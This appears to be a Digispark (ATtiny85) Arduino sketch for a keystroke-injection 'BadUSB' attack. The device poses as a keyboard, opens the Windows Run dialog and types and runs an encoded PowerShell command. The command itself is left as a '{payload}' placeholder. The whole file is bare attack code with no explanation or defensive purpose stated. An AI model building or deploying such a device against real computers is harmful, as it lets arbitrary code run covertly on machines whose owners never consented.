#include "DigiKeyboard.h"
void setup() {
    DigiKeyboard.delay(1000);
}

void loop() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("powershell /enc {payload}");
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    for (;;) {
        DigiKeyboard.delay(1000);
    }
}
